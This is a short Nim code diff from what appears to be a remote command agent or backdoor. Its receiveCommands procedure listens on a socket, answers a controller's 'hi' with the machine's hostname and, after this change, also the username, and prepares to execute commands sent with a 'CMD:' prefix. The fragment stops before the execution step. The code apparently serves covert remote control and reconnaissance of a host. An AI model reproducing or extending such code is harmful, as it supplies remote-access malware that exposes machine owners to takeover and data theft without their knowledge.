@@ -23,7 +23,7 @@ proc receiveCommands(client: Socket) =
             quit(0)
         echo line
         if line == "hi":
-            client.send(&"INFO:{hostname()}\r\n")
+            client.send(&"INFO:{hostname()}:{username()}\r\n")
         if line.startsWith("CMD:"):
             # echo "executing: " & 
             let cmd = args[1..(argsn - 1)].join(":")
